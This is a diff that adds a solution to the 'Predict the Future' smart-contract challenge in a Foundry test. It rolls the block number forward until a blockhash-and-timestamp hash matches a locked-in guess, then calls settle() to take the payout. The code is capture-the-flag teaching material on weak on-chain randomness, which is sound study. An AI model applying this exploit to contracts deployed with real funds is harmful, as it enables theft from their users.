@@ -20,8 +20,13 @@ contract PredictTheFutureTest is Test {
         // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
         vm.roll(104293);
         vm.warp(93582192);
-
+        
         // Put your solution here
+        uint8 guess = 5;
+        predictTheFuture.lockInGuess{value: 1 ether}(guess);
+        while (!(exploit(guess))) {
+           vm.roll(block.number + 1);
+        }
 
         _checkSolved();
     }
@@ -30,5 +35,23 @@ contract PredictTheFutureTest is Test {
         assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
     }
 
+    function exploit(uint8 guess) public returns (bool) {
+        uint8 answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        ) % 10;
+        if (answer == guess) {
+            predictTheFuture.settle();
+            return true;
+        } else {
+            return false;
+        }
+    }
     receive() external payable {}
 }
